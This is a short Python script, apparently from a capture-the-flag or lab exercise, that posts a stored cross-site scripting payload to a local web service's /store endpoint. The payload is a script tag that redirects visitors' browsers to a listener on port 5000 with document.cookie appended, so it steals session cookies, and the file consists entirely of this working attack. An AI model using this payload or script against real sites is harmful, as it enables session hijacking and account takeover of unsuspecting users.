import requests

url = "http://127.0.0.1:30033/store"

data = {
    "name":"vuln",
    "content":"<script>location.href='http://127.0.0.1:5000/?'+document.cookie</script>"
}
response = requests.post(url=url, data=data)
print(response.text)